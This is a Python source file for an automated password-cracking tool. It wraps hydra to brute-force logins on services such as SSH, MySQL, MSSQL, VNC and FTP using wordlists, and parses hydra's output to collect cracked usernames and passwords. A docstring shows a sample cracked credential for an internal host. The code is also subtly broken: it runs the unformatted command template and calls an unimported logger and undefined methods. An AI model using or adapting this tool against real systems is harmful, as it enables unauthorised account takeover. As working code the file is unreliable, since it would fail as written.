#!/usr/bin/env python
# coding=utf-8

'''
this aim to crack the port such as ssh, mssql, mysql, vnc and so on
'''

import random
import re
import string
from os import system
from os import path


class PortCrack(object):
    def __init__(self, port=None, ip=None, service=None):
        self.port = port
        self.service = service
        self.ip = ip
        self.username = 'username.txt'
        self.password = 'password.txt'

    def get_path(self):
        here = path.split(path.abspath(__file__))[0]
        return here

    def randStr(self, length=8):
        allchar = string.lowercase + string.uppercase + string.digits
        return ''.join(random.sample(allchar, length))

    def work(self):
        if self.ip is None or self.port is None or self.service is None:
            return
        cmd = 'hydra -L {uname} -P {passwd} -t 4 -s {port} -e -f -o {resultfile} {server} {service}'
        here = self.get_path()
        uname = path.join(here, self.username)
        passwd = path.join(here, self.password)
        resultfile = '/tmp/{}.txt'.format(self.randStr())
        r_cmd = cmd.format(uname=uname,
                        passwd=passwd,
                        port=self.port,
                        resultfile=resultfile,
                        server=self.ip,
                        service=self.service
                        )
        code = system(cmd)

    def parse_result_hydra(self, ret, tmpfile):
        """
        [21][ftp] host: 10.15.154.142   login: ftpftp   password: h123123a
        """
        try:
            if not path.exists(tmpfile):
                return
            for line in open(tmpfile, 'r').readlines():
                line = str(line).strip('\r\n')
                if not line:
                    continue
                m = re.findall(r'host: (\S*).*login: (\S*).*password:(.*)', line)
                if m and m[0] and len(m[0]) == 3:
                    username = m[0][1]
                    password = m[0][2].strip()
                    self.push_vul(username, password, line)
            return len(self.vul_list)
        except Exception as e:
            logging.error('[PortCrackBase][parse_result_hydra] Exception %s' % e)
